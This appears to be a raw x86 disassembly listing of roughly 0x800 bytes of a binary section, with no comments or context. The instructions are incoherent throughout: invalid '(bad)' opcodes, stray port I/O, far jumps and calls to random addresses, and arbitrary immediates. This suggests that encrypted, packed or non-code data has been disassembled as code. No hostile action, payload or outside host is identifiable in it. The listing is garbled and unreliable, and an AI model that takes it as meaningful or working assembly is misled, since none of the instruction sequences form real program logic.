  406a9d:	xor    eax,0x78121bc9
  406aa2:	push   ebp
  406aa3:	mov    esp,ebp
  406aa5:	cmp    eax,0xa62482e8
  406aaa:	inc    esi
  406aab:	sub    DWORD PTR [edi-0x614dea30],0x8d4e01ae
  406ab5:	ins    BYTE PTR es:[edi],dx
  406ab6:	jge    0x406a88
  406ab8:	xchg   DWORD PTR [ebp+0x386a32cc],edi
  406abe:	or     bh,BYTE PTR [edi+0x9]
  406ac1:	das    
  406ac2:	add    esp,DWORD PTR [esi+0x135ecd7a]
  406ac8:	pop    ebp
  406ac9:	pop    edi
  406aca:	lods   eax,DWORD PTR ds:[esi]
  406acb:	pushf  
  406acc:	mov    eax,ds:0x369d11a0
  406ad1:	cmp    al,BYTE PTR [edi+ebx*1]
  406ad4:	test   DWORD PTR [edi+esi*2-0x47],eax
  406ad8:	retf   0x5ba
  406adb:	fnstsw WORD PTR [ebx+0x793191e9]
  406ae1:	xlat   BYTE PTR ds:[ebx]
  406ae2:	cmp    al,0x5d
  406ae4:	stc    
  406ae5:	inc    edx
  406ae6:	dec    ebp
  406ae7:	ins    DWORD PTR es:[edi],dx
  406ae8:	jmp    0x40326822
  406aed:	add    al,0x74
  406aef:	in     al,0xe7
  406af1:	add    al,BYTE PTR [esp+ebx*2-0x59a57310]
  406af8:	in     al,0x7a
  406afa:	inc    eax
  406afb:	(bad)  
  406afc:	ins    DWORD PTR es:[edi],dx
  406afd:	jns    0x406b00
  406aff:	imul   eax,DWORD PTR [ecx],0x78
  406b02:	push   0x8444cded
  406b07:	test   BYTE PTR [ecx-0x2850d906],al
  406b0d:	call   0x3a46c021
  406b12:	or     DWORD PTR [edx+0x2f],esp
  406b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b16:	out    0x3b,al
  406b18:	cmp    eax,0x5c15708c
  406b1d:	or     BYTE PTR [edx],ch
  406b1f:	lahf   
  406b20:	aas    
  406b21:	mov    al,0xe0
  406b23:	inc    esp
  406b24:	dec    esi
  406b25:	inc    esi
  406b26:	add    DWORD PTR [eax+0x56],0x122aeab3
  406b2d:	arpl   WORD PTR [esi-0x61],ax
  406b30:	cmp    eax,0xf18525cf
  406b35:	xor    cl,dh
  406b37:	or     ebp,DWORD PTR [eax+0x6a]
  406b3a:	jle    0x406aec
  406b3c:	cli    
  406b3d:	lea    esi,[esi+0x640f6293]
  406b43:	pushf  
  406b44:	jne    0x406b75
  406b46:	fld    st(1)
  406b48:	enter  0x7fbb,0x53
  406b4c:	inc    esi
  406b4d:	leave  
  406b4e:	mov    bl,cl
  406b50:	xlat   BYTE PTR ds:[ebx]
  406b51:	pop    ss
  406b52:	mov    ss,WORD PTR [ecx-0x79]
  406b55:	lods   al,BYTE PTR ds:[esi]
  406b56:	inc    eax
  406b57:	adc    al,0x1b
  406b59:	dec    ebp
  406b5a:	aaa    
  406b5b:	mov    ch,0xdd
  406b5d:	xlat   BYTE PTR ds:[ebx]
  406b5e:	dec    ecx
  406b5f:	fsubr  DWORD PTR [edi-0x54]
  406b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b64:	loop   0x406b2d
  406b66:	ror    BYTE PTR [ecx-0x56],1
  406b69:	sub    eax,edx
  406b6b:	push   esi
  406b6c:	int3   
  406b6d:	mov    dh,0x39
  406b6f:	in     al,dx
  406b70:	pop    edx
  406b71:	xor    BYTE PTR [eax-0x44399963],bl
  406b77:	retf   0xe51f
  406b7a:	inc    edi
  406b7b:	(bad)  [esi+0x73]
  406b7e:	xor    BYTE PTR [eax],dl
  406b80:	adc    al,0x4d
  406b82:	xchg   DWORD PTR [ebp*1+0x1a82cbf1],esi
  406b89:	ret    
  406b8a:	fbstp  TBYTE PTR [ebx+0x60200968]
  406b90:	mov    ch,0x51
  406b92:	jbe    0x406bd2
  406b94:	(bad)  
  406b95:	out    0xcb,al
  406b97:	push   0xea627780
  406b9c:	call   0xba38d24d
  406ba1:	jecxz  0x406b24
  406ba3:	xor    ch,bl
  406ba5:	sbb    cl,BYTE PTR [edx-0x62a1270]
  406bab:	dec    eax
  406bac:	arpl   WORD PTR [ecx+0x70],si
  406baf:	dec    edi
  406bb0:	cmp    al,0x8c
  406bb2:	xor    bl,BYTE PTR [ebx+0x58fd01e6]
  406bb8:	xor    eax,0x33489c0a
  406bbd:	add    esp,DWORD PTR [edx]
  406bbf:	mov    ebp,0x3c2f082e
  406bc4:	sti    
  406bc5:	mov    dh,0x9a
  406bc7:	neg    DWORD PTR [ebp-0xb84bf2e]
  406bcd:	jp     0x406bea
  406bcf:	jne    0x406b62
  406bd1:	push   edi
  406bd2:	retf   0xf3bb
  406bd5:	mov    WORD PTR [ecx-0x1b],ds
  406bd8:	pop    esi
  406bd9:	stos   BYTE PTR es:[edi],al
  406bda:	lahf   
  406bdb:	push   0xffffffd7
  406bdd:	pop    ds
  406bde:	cmp    edi,DWORD PTR [edx-0x4320d386]
  406be4:	mov    WORD PTR [eax+0x43],es
  406be7:	sub    esi,esp
  406be9:	cmp    ebp,esi
  406beb:	xor    eax,0x88d77725
  406bf0:	mov    esp,0x5ff48441
  406bf5:	ret    0xe0e
  406bf8:	in     al,dx
  406bf9:	mov    ds:0xa3458579,eax
  406bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bff:	jmp    0xb37e:0xac31644d
  406c06:	mov    ebx,0xb3b88240
  406c0b:	mov    dl,0xd6
  406c0d:	xchg   ecx,eax
  406c0e:	ins    DWORD PTR es:[edi],dx
  406c0f:	data16 int 0x50
  406c12:	or     edi,ecx
  406c14:	faddp  st(0),st
  406c16:	sahf   
  406c17:	mov    ah,0xed
  406c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c1a:	jle    0x406baa
  406c1c:	ins    DWORD PTR es:[edi],dx
  406c1d:	imul   esp,DWORD PTR [ebx],0x20
  406c20:	push   edi
  406c21:	xchg   edi,eax
  406c22:	pop    edx
  406c23:	fdiv   DWORD PTR [eax]
  406c25:	mov    ds:0xb3e1b8d9,eax
  406c2a:	sahf   
  406c2b:	ds jmp 0xd8a6e8f6
  406c31:	outs   dx,BYTE PTR ds:[esi]
  406c32:	add    eax,0xe031b2dd
  406c37:	outs   dx,DWORD PTR ds:[esi]
  406c38:	daa    
  406c39:	enter  0xe8e0,0xf0
  406c3d:	icebp  
  406c3e:	inc    esp
  406c3f:	fcom   DWORD PTR [ecx-0x15]
  406c42:	sbb    ah,BYTE PTR [ebp+0x31200c73]
  406c48:	aas    
  406c49:	push   cs
  406c4a:	xchg   ebp,eax
  406c4b:	mov    edi,0x127fcb6e
  406c50:	rol    DWORD PTR [edi-0x78fac6c3],0x3f
  406c57:	out    0x8b,eax
  406c59:	mov    ds:0xbb0465d5,eax
  406c5e:	mov    ds:0xeffdd6fa,al
  406c63:	cwde   
  406c64:	adc    DWORD PTR [edx-0x24a67cfe],ebp
  406c6a:	gs adc al,0xe7
  406c6d:	cwde   
  406c6e:	xchg   edx,eax
  406c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c70:	inc    ecx
  406c71:	rcl    BYTE PTR [ebx-0x4babf509],1
  406c77:	sbb    al,0x55
  406c79:	jo     0x406c19
  406c7b:	mov    gs,ebp
  406c7d:	fcomp  QWORD PTR [eax+0x56]
  406c80:	pop    esi
  406c81:	or     bl,dl
  406c83:	or     BYTE PTR [eax],dl
  406c85:	cmp    BYTE PTR [esi],dh
  406c87:	repz or BYTE PTR [ebp+0x4],al
  406c8b:	adc    DWORD PTR [ebx],ebp
  406c8d:	adc    ch,ch
  406c8f:	popa   
  406c90:	sbb    al,0x24
  406c92:	repz jl 0x406c72
  406c95:	cdq    
  406c96:	sar    esp,1
  406c98:	cld    
  406c99:	lea    esi,[esi]
  406c9b:	dec    ebx
  406c9c:	je     0x406c4d
  406c9e:	mov    bl,0xd9
  406ca0:	push   ebp
  406ca1:	out    0xf4,eax
  406ca3:	and    esp,DWORD PTR [edi]
  406ca5:	cmp    bl,bl
  406ca7:	daa    
  406ca8:	push   ebx
  406ca9:	or     al,BYTE PTR ds:0xfde8abc8
  406caf:	call   edi
  406cb1:	mov    edx,DWORD PTR [esi+0x48]
  406cb4:	mov    dl,BYTE PTR [esi+0x475678e7]
  406cba:	(bad)  
  406cbb:	adc    DWORD PTR ds:0x18fc49e5,eax
  406cc1:	cwde   
  406cc2:	sbb    al,0x8b
  406cc4:	push   ebp
  406cc5:	bnd jmp 0x406d10
  406cc8:	push   cs
  406cc9:	sar    DWORD PTR [esi],1
  406ccb:	mov    eax,DWORD PTR [esi]
  406ccd:	push   0x11c813b1
  406cd2:	dec    esi
  406cd3:	and    DWORD PTR [ecx+0x4af8501e],edx
  406cd9:	(bad)  
  406cda:	in     al,dx
  406cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cdc:	stc    
  406cdd:	cmp    DWORD PTR [eax+edx*8-0x889d7ef],edi
  406ce4:	fisttp DWORD PTR [edx-0x5c0f1445]
  406cea:	and    BYTE PTR [eax],bh
  406cec:	(bad)
  406cef:	mov    esi,0x3df31047
  406cf4:	xor    al,0xcb
  406cf6:	ja     0x406d5c
  406cf8:	std    
  406cf9:	adc    DWORD PTR [edx+0x7df726a8],esi
  406cff:	xor    al,BYTE PTR [ebx-0x6c]
  406d02:	ret    
  406d03:	xchg   ebp,eax
  406d04:	cmc    
  406d05:	lods   al,BYTE PTR ds:[esi]
  406d06:	fdivrp st(4),st
  406d08:	adc    ah,BYTE PTR [edx-0x4]
  406d0b:	pop    ds
  406d0c:	lods   eax,DWORD PTR ds:[esi]
  406d0d:	dec    esi
  406d0e:	xchg   edx,eax
  406d0f:	xlat   BYTE PTR ds:[ebx]
  406d10:	dec    ecx
  406d11:	pop    ss
  406d12:	mov    ebp,0x9b91e939
  406d17:	imul   edx,esp,0xffffffea
  406d1a:	imul   edx,ecx,0x21
  406d1d:	inc    BYTE PTR ds:0x6fe6c063
  406d23:	in     eax,0xa2
  406d25:	lock daa 
  406d27:	iret   
  406d28:	adc    BYTE PTR [esi+0x31],cl
  406d2b:	push   ebp
  406d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d2d:	loope  0x406d31
  406d2f:	add    edx,ecx
  406d31:	ins    BYTE PTR es:[edi],dx
  406d32:	(bad)  
  406d33:	aas    
  406d34:	dec    esp
  406d35:	jne    0x406d57
  406d37:	test   BYTE PTR [edi-0x9],0x6d
  406d3b:	or     ebx,DWORD PTR [ebx+ebp*1]
  406d3e:	ins    BYTE PTR es:[edi],dx
  406d3f:	aad    0x28
  406d41:	cmp    BYTE PTR [eax],ch
  406d43:	call   0xd0cf921b
  406d48:	(bad)  
  406d49:	fs inc esi
  406d4b:	add    ah,bh
  406d4d:	adc    eax,0xb1c3bf8d
  406d52:	sbb    BYTE PTR [edi-0x2b3cfefb],al
  406d58:	sub    al,0x4a
  406d5a:	pop    eax
  406d5b:	or     esi,DWORD PTR [eax+esi*2+0x2]
  406d5f:	mov    bl,0x7c
  406d61:	dec    ebx
  406d62:	in     eax,0xcd
  406d64:	mov    al,0x21
  406d66:	or     DWORD PTR [ecx],0x8bc79b45
  406d6c:	xchg   ebx,eax
  406d6d:	stos   BYTE PTR es:[edi],al
  406d6e:	push   edx
  406d6f:	xchg   bl,dl
  406d71:	loope  0x406deb
  406d73:	lock mov ebx,0xec09d2f2
  406d79:	popa   
  406d7a:	shl    DWORD PTR [esi],1
  406d7c:	cli    
  406d7d:	jge    0x406d69
  406d7f:	mov    ch,0x62
  406d81:	sbb    dh,ah
  406d83:	(bad)  
  406d84:	stc    
  406d85:	adc    DWORD PTR [ecx],esp
  406d87:	pusha  
  406d88:	sti    
  406d89:	add    al,0x90
  406d8b:	data16 xor dl,BYTE PTR [edx]
  406d8e:	sbb    al,0xd3
  406d90:	mov    edi,0x608e579a
  406d95:	pop    esi
  406d96:	test   ch,dh
  406d98:	pop    ebx
  406d99:	mov    ebp,0xe772ad3f
  406d9e:	xchg   esi,eax
  406d9f:	sahf   
  406da0:	and    BYTE PTR [edx-0x70c40bb8],0x8a
  406da7:	inc    ebx
  406da8:	pop    esp
  406da9:	in     eax,dx
  406daa:	fimul  DWORD PTR [ecx-0x71]
  406dad:	fstp   DWORD PTR [edi]
  406daf:	pop    ds
  406db0:	inc    ebp
  406db1:	xchg   ebp,eax
  406db2:	cdq    
  406db3:	xor    eax,0xb5f30d24
  406db8:	mov    esi,0x37c89f19
  406dbd:	test   eax,0x9b2df0
  406dc2:	imul   ebx,DWORD PTR [edx-0x28a3ac13],0x38
  406dc9:	sbb    DWORD PTR [edx-0x18],0xffffff89
  406dcd:	out    dx,eax
  406dce:	mov    esp,0x57c66ae4
  406dd3:	aam    0x5e
  406dd5:	scas   eax,DWORD PTR es:[edi]
  406dd6:	sbb    ah,BYTE PTR [ecx]
  406dd8:	(bad)  
  406dd9:	leave  
  406dda:	mov    eax,ds:0x5704152d
  406ddf:	rcr    esi,1
  406de1:	inc    esi
  406de2:	mov    al,0x79
  406de4:	std    
  406de5:	out    0x9c,eax
  406de7:	sub    BYTE PTR [edx-0x21],bl
  406dea:	sbb    ah,BYTE PTR [ebp+0xd17648c]
  406df0:	add    ecx,DWORD PTR [edi]
  406df2:	imul   ebp,DWORD PTR [edx],0xbc7ecd5b
  406df8:	xchg   ecx,eax
  406df9:	fnstenv [edx]
  406dfb:	sub    BYTE PTR [esi-0x71],0x7d
  406dff:	outs   dx,BYTE PTR ds:[esi]
  406e00:	cld    
  406e01:	mov    al,ds:0x33ca380a
  406e06:	dec    ebp
  406e07:	sub    eax,0xeb4b4707
  406e0c:	jmp    0x406da5
  406e0e:	sub    edi,ecx
  406e10:	jne    0x406e23
  406e12:	add    ecx,edi
  406e14:	and    eax,DWORD PTR [esi-0x118430ad]
  406e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e1b:	es xchg dl,bl
  406e1e:	lds    edx,FWORD PTR [edi+0x4559b41f]
  406e24:	(bad)
  406e28:	mov    dh,0x23
  406e2a:	mov    ds:0x8f363ea0,eax
  406e2f:	sub    eax,0x1a5eed1
  406e34:	xchg   edx,eax
  406e35:	mov    ebx,0x1fa3413
  406e3a:	repnz and DWORD PTR [ecx+0x74],esp
  406e3e:	repnz cs daa 
  406e41:	push   ds
  406e42:	lods   al,BYTE PTR ds:[esi]
  406e43:	shl    BYTE PTR [eax-0x63],0xd3
  406e47:	test   eax,0xd18918b9
  406e4c:	inc    ecx
  406e4d:	jns    0x406dcf
  406e4f:	sub    ecx,DWORD PTR [ebx+0x5c7e055]
  406e55:	mov    DWORD PTR [esi+0x43],0x7e0000
  406e5c:	add    cl,ch
  406e5e:	jmp    0x86406e66
  406e63:	shl    BYTE PTR [ebx-0x62a68c68],cl
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x17673b84]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e6a
  406e7b:	ins    DWORD PTR es:[edi],dx
  406e7c:	jo     0x406dfe
  406e7e:	adc    ah,cl
  406e80:	inc    esi
  406e81:	xchg   edx,eax
  406e82:	clc    
  406e83:	cmp    al,0xb0
  406e85:	mov    eax,0x26a0ce3e
  406e8a:	div    BYTE PTR [ebx]
  406e8c:	gs mov esi,0xa4c0f73c
  406e92:	cwde   
  406e93:	dec    ebp
  406e94:	and    eax,0xc0b4e325
  406e99:	sbb    edx,edi
  406e9b:	sar    BYTE PTR [ebp-0x513cac80],1
  406ea1:	int3   
  406ea2:	jb     0x406e58
  406ea4:	jns    0x406ee7
  406ea6:	sbb    BYTE PTR [ebp-0xbfebb56],dh
  406eac:	xlat   BYTE PTR ds:[ebx]
  406ead:	repnz push ds
  406eaf:	jb     0x406e9b
  406eb1:	xor    ch,BYTE PTR [edx-0x14]
  406eb4:	mov    eax,DWORD PTR [edi+0x9]
  406eb7:	jp     0x406e65
  406eb9:	inc    esp
  406eba:	and    ebx,esp
  406ebc:	add    DWORD PTR [edi+0x19],ecx
  406ebf:	(bad)  
  406ec0:	sub    BYTE PTR [edx-0x15],ch
  406ec3:	push   ecx
  406ec4:	and    BYTE PTR [ecx+0x70],bl
  406ec7:	sub    ebx,eax
  406ec9:	imul   edx,DWORD PTR [ecx-0x371a76ad],0xe112731f
  406ed3:	ror    BYTE PTR [edx-0x14],cl
  406ed6:	pop    ss
  406ed7:	hlt    
  406ed8:	xchg   esp,eax
  406ed9:	push   ebp
  406eda:	mov    esi,DWORD PTR [eax-0x2df43fe6]
  406ee0:	es cs aas 
  406ee3:	mov    dh,0x20
  406ee5:	xchg   edx,eax
  406ee6:	das    
  406ee7:	fbstp  TBYTE PTR [ebx-0x1]
  406eea:	std    
  406eeb:	cwde   
  406eec:	cmp    dh,BYTE PTR [ecx+0x3d22fab1]
  406ef2:	daa    
  406ef3:	shr    BYTE PTR [ebp-0x34],0x82
  406ef7:	rcl    BYTE PTR [edx+0x5],0xfb
  406efb:	cwde   
  406efc:	mov    ds:0xde634083,al
  406f01:	shl    DWORD PTR [esi],0xb1
  406f04:	adc    al,0x9f
  406f06:	push   edi
  406f07:	(bad)  
  406f08:	dec    ecx
  406f09:	cmp    bl,bh
  406f0b:	std    
  406f0c:	jp     0x406ebb
  406f0e:	cmc    
  406f0f:	jg     0x406f30
  406f11:	add    bl,dh
  406f13:	inc    edi
  406f14:	call   0xf451bfe1
  406f19:	inc    esi
  406f1a:	and    DWORD PTR [eax-0x7d],ebp
  406f1d:	jno    0x406eae
  406f1f:	dec    ecx
  406f20:	retf   
  406f21:	fnstenv [edi+esi*2]
  406f24:	outs   dx,DWORD PTR ds:[esi]
  406f25:	mov    bh,0xe4
  406f27:	mov    eax,0xff180bd3
  406f2c:	sbb    eax,DWORD PTR [eax-0x13b867d0]
  406f32:	lds    esp,FWORD PTR [edx-0x36]
  406f35:	dec    ebp
  406f36:	les    edx,FWORD PTR [edx-0x1b]
  406f39:	cmp    eax,0x17ead1d0
  406f3e:	mov    al,ds:0x6b418f64
  406f43:	fisttp DWORD PTR [ebp-0x6]
  406f46:	bound  edx,QWORD PTR [eax]
  406f48:	in     al,dx
  406f49:	retf   
  406f4a:	std    
  406f4b:	out    0xe3,al
  406f4d:	loop   0x406ede
  406f4f:	nop
  406f50:	(bad)  
  406f51:	js     0x406f1d
  406f53:	sbb    DWORD PTR [ecx+0x28],eax
  406f56:	test   eax,0x66531e17
  406f5b:	jmp    0xad673e34
  406f60:	or     eax,0xdda8f4e8
  406f65:	jecxz  0x406fe3
  406f67:	xchg   esi,eax
  406f68:	aad    0x9f
  406f6a:	jne    0x406fdc
  406f6c:	and    edx,DWORD PTR ds:0x7aa2688e
  406f72:	mov    ds:0x7d3b482d,eax
  406f77:	cld    
  406f78:	push   ds
  406f79:	cwde   
  406f7a:	xor    BYTE PTR [ebp+0x77caa4f9],0x93
  406f81:	pop    ebp
  406f82:	add    DWORD PTR [ecx-0x3f],0xce54471c
  406f89:	inc    ebp
  406f8a:	jp     0x406fc9
  406f8c:	mov    ebx,0xd1ac13d7
  406f91:	ficomp DWORD PTR [edx-0x2e]
  406f94:	clc    
  406f95:	lods   eax,DWORD PTR ds:[esi]
  406f96:	adc    eax,0x1126b36f
  406f9b:	cmp    DWORD PTR [ecx+edx*4],esp
  406f9e:	xlat   BYTE PTR ds:[ebx]
  406f9f:	scas   eax,DWORD PTR es:[edi]
  406fa0:	in     eax,dx
  406fa1:	push   eax
  406fa2:	popa   
  406fa3:	jae    0x406f46
  406fa5:	xor    esi,DWORD PTR [ebp-0xa]
  406fa8:	cs xor eax,ecx
  406fab:	lock sub dl,bl
  406fae:	mov    dl,0xb7
  406fb0:	ret    
  406fb1:	push   esi
  406fb2:	or     DWORD PTR [edx+0x4908d4e1],edi
  406fb8:	test   BYTE PTR [esi+0x2fc8b552],dh
  406fbe:	sub    eax,0xd49654d8
  406fc3:	xchg   ebp,eax
  406fc4:	sahf   
  406fc5:	lods   eax,DWORD PTR ds:[esi]
  406fc6:	add    DWORD PTR [eax],esi
  406fc8:	or     al,BYTE PTR [edx+0x2aab74ba]
  406fce:	and    eax,0x4b23c05e
  406fd3:	fadd   DWORD PTR [ecx+ecx*4+0x15]
  406fd7:	cmp    BYTE PTR [esp+edi*2+0x4b],ch
  406fdb:	inc    ebp
  406fdc:	(bad)  
  406fdd:	repz in eax,dx
  406fdf:	stos   DWORD PTR es:[edi],eax
  406fe0:	xor    al,0xb6
  406fe2:	sub    BYTE PTR [eax-0x57],bl
  406fe5:	ret    
  406fe6:	and    al,0x5d
  406fe8:	jb     0x40705b
  406fea:	fcmovb st,st(5)
  406fec:	nop
  406fed:	add    al,al
  406fef:	inc    edi
  406ff0:	mov    bl,0xfe
  406ff2:	adc    BYTE PTR [eax+0x10273b74],bh
  406ff8:	(bad)  
  406ff9:	(bad)  
  406ffb:	pusha  
  406ffc:	adc    al,0x9f
  406ffe:	call   0xfc09:0x907f7d83
  407005:	xchg   ebp,eax
  407006:	add    BYTE PTR [edi],dh
  407008:	sbb    al,0x19
  40700a:	inc    edx
  40700b:	sub    ah,BYTE PTR [ecx+0x66]
  40700e:	cmc    
  40700f:	mov    al,ds:0xbc98fbef
  407014:	or     al,0x53
  407016:	ja     0x407011
  407018:	sub    eax,0xe9c670bc
  40701d:	into   
  40701e:	es or  eax,0xebfe7589
  407024:	fisubr WORD PTR [edi]
  407026:	sbb    eax,0xb2393347
  40702b:	lahf   
  40702c:	sub    eax,0xcd09b059
  407031:	lods   eax,DWORD PTR ds:[esi]
  407032:	nop
  407033:	(bad)  [eax]
  407035:	cmp    BYTE PTR [esi],ch
  407037:	push   0x8e8bafc8
  40703c:	mov    edx,0x255dda0a
  407041:	outs   dx,DWORD PTR ds:[esi]
  407042:	dec    eax
  407043:	(bad)  
  407044:	xchg   ebp,eax
  407045:	test   eax,0xe21e0c30
  40704a:	xchg   edi,eax
  40704b:	inc    edi
  40704c:	or     DWORD PTR [esi],esi
  40704e:	call   0xaecb6f41
  407053:	cwde   
  407054:	adc    BYTE PTR [eax],ah
  407056:	or     al,0x4
  407058:	sbb    BYTE PTR [esi],dl
  40705a:	inc    ebx
  40705b:	jbe    0x407061
  40705d:	push   0xffffff8b
  40705f:	jg     0x40700b
  407061:	or     bh,dl
  407063:	xlat   BYTE PTR ds:[ebx]
  407064:	cmp    dl,BYTE PTR es:[ebx]
  407067:	inc    ebp
  407068:	int    0x1f
  40706a:	push   ecx
  40706b:	add    al,0xb2
  40706d:	xor    al,0x22
  40706f:	xchg   BYTE PTR ss:[ecx-0x43125a05],al
  407076:	test   BYTE PTR [edi-0x26],al
  407079:	push   ss
  40707a:	jmp    0x407041
  40707c:	das    
  40707d:	das    
  40707e:	ins    BYTE PTR es:[edi],dx
  40707f:	enter  0x8a28,0xd7
  407083:	sub    al,0x52
  407085:	adc    al,0xa9
  407087:	sahf   
  407088:	int    0xb4
  40708a:	test   al,0x3e
  40708c:	push   ds
  40708d:	mov    ?,esi
  40708f:	or     esp,ebp
  407091:	push   0x39
  407093:	or     DWORD PTR [edx-0x750052ad],ecx
  407099:	push   edi
  40709a:	ficom  WORD PTR [esi]
  40709c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40709d:	sbb    DWORD PTR [ecx+0x7405dd23],0x854015d8
  4070a7:	mov    ebp,0x892a1422
  4070ac:	into   
  4070ad:	mov    dl,0x4d
  4070af:	hlt    
  4070b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b1:	and    ch,cl
  4070b3:	jb     0x40703d
  4070b5:	popa   
  4070b6:	add    DWORD PTR [ecx-0x7479de5e],edx
  4070bc:	fdiv   st(6),st
  4070be:	pop    eax
  4070bf:	mov    eax,ds:0x4dd31705
  4070c4:	retf   0x3331
  4070c7:	push   edi
  4070c8:	pop    ebp
  4070c9:	or     DWORD PTR [esi+0x6960bf0f],0x3eb39565
  4070d3:	les    ecx,FWORD PTR [ecx-0x5e]
  4070d6:	leave  
  4070d7:	cmc    
  4070d8:	shl    dh,0xb0
  4070db:	mov    cl,0xa8
  4070dd:	mov    edi,0x5e62682f
  4070e2:	ja     0x4070b4
  4070e4:	out    0xb3,al
  4070e6:	sub    al,0x57
  4070e8:	les    edi,FWORD PTR [ebp+0x6c35d120]
  4070ee:	add    BYTE PTR [eax+0x4ce748bf],bh
  4070f4:	dec    ebx
  4070f5:	in     eax,dx
  4070f6:	mov    ebp,?
  4070f8:	sub    al,cl
  4070fa:	cmp    edi,ecx
  4070fc:	sbb    ah,BYTE PTR [edx-0x3c8d26b]
  407102:	sbb    edi,DWORD PTR [eax-0x4f]
  407105:	push   edx
  407106:	lock daa 
  407108:	outs   dx,DWORD PTR ds:[esi]
  407109:	adc    ch,BYTE PTR [edx-0x2b]
  40710c:	loop   0x407171
  40710e:	and    DWORD PTR [eax],0xffffffec
  407111:	adc    eax,0x82a50e2
  407116:	aad    0x29
  407118:	mov    ds:0xa135e5c0,eax
  40711d:	push   0xd810797e
  407122:	pop    ecx
  407123:	es dec eax
  407125:	loope  0x4070e2
  407127:	test   al,0xec
  407129:	das    
  40712a:	mov    eax,0x65692421
  40712f:	bound  edi,QWORD PTR [ebx-0x11d0db95]
  407135:	mov    esi,?
  407137:	mov    ds:0xb64e9b37,al
  40713c:	dec    ebp
  40713d:	test   eax,0x66edd9a
  407142:	fwait
  407143:	mov    dh,0xe5
  407145:	cmp    ebx,DWORD PTR [edx-0x1a77353e]
  40714b:	cmpxchg8b (bad)
  40714c:	(bad)  
  40714d:	enter  0xd0df,0x81
  407151:	loope  0x40710a
  407153:	sbb    BYTE PTR [ebp-0x72],0x95
  407157:	repz (bad) 
  40715a:	or     cl,BYTE PTR [ebx+0x40]
  40715d:	scas   eax,DWORD PTR es:[edi]
  40715e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40715f:	adc    edi,DWORD PTR [edi]
  407161:	xlat   BYTE PTR ds:[ebx]
  407162:	push   es
  407163:	sub    eax,0xdde5f7ac
  407168:	out    dx,eax
  407169:	into   
  40716a:	rcr    DWORD PTR [edi+0x1b],cl
  40716d:	or     DWORD PTR [edi+0xd],ecx
  407170:	add    al,0x9f
  407172:	pop    esp
  407173:	std    
  407174:	daa    
  407175:	dec    edx
  407176:	adc    BYTE PTR [edx+0x3f],dl
  407179:	xchg   esi,eax
  40717a:	shl    BYTE PTR [eax+0x4b855182],1
  407180:	mov    dl,0xb1
  407182:	and    DWORD PTR [ecx+0x58],0xe4bf14f8
  407189:	out    dx,eax
  40718a:	out    0x9f,eax
  40718c:	cmp    eax,0xe98068b6
  407191:	jno    0x407161
  407193:	push   eax
  407194:	dec    ebp
  407195:	cmp    eax,0x5cbed8b9
  40719a:	(bad)  
  40719b:	test   al,0xcb
  40719d:	out    dx,eax
  40719e:	mov    edi,0x68998aaa
  4071a3:	pop    edx
  4071a4:	pop    ss
  4071a5:	and    edi,DWORD PTR [ecx-0x30]
  4071a8:	push   cs
  4071a9:	ss ret 
  4071ab:	sbb    eax,ecx
  4071ad:	jbe    0x407175
  4071af:	in     eax,dx
  4071b0:	pop    ss
  4071b1:	es jge 0x4071c1
  4071b4:	imul   ecx,DWORD PTR [ecx],0x61
  4071b7:	cpuid  
  4071b9:	sub    bl,dh
  4071bb:	push   ds
  4071bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071bd:	call   0xdbc4102
  4071c2:	scas   eax,DWORD PTR es:[edi]
  4071c3:	call   0xdb98b673
  4071c8:	ror    BYTE PTR [ecx-0x3],0x1a
  4071cc:	inc    esi
  4071cd:	pop    ds
  4071ce:	sub    dl,ah
  4071d0:	retf   0xaa2d
  4071d3:	shl    BYTE PTR [ebx],cl
  4071d5:	or     dh,bh
  4071d7:	add    ecx,edi
  4071d9:	dec    eax
  4071da:	lea    ecx,[esi+0x7e]
  4071dd:	idiv   BYTE PTR [eax-0x20bd7c13]
  4071e3:	jnp    0x407168
  4071e5:	jmp    0xe07b:0x6aca935e
  4071ec:	jecxz  0x407218
  4071ee:	(bad)  
  4071ef:	repz (bad) 
  4071f1:	loop   0x4071a5
  4071f3:	ret    
  4071f4:	jbe    0x4071f7
  4071f6:	sbb    DWORD PTR [eax+0xebacb0d],ebx
  4071fc:	dec    esi
  4071fd:	pop    ss
  4071fe:	jnp    0x407256
  407200:	cmp    ecx,DWORD PTR [ecx-0x342f277b]
  407206:	pop    ds
  407207:	mov    fs,edi
  407209:	xchg   ebp,eax
  40720a:	and    DWORD PTR [esi+ebx*1],edx
  40720d:	in     al,0xe0
  40720f:	repz cmc 
  407211:	sar    esi,0xbc
  407214:	das    
  407215:	rcr    BYTE PTR [eax+0x1a],0xb0
  407219:	mov    cl,0xea
  40721b:	jae    0x4071fb
  40721d:	adc    esi,DWORD PTR [eax-0x7fb1c7ed]
  407223:	cmp    BYTE PTR [ebx+0x2b],dh
  407226:	sahf   
  407227:	addr16 aas 
  407229:	(bad)  
  40722a:	retf   
  40722b:	test   eax,0xde485903
  407230:	mov    ecx,0x78cc171d
  407235:	in     al,dx
  407236:	cmp    al,bl
  407238:	outs   dx,BYTE PTR ds:[esi]
  407239:	mov    ch,0xf2
  40723b:	cmp    al,0xbc
  40723d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40723e:	aad    0x6b
  407240:	jmp    0x6cba2b0e
  407245:	ins    DWORD PTR es:[edi],dx
  407246:	sbb    al,0x78
  407248:	inc    ebp
  40724a:	mov    ebx,0x39d445c7
  40724f:	dec    edi
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x43466f,0x15ae
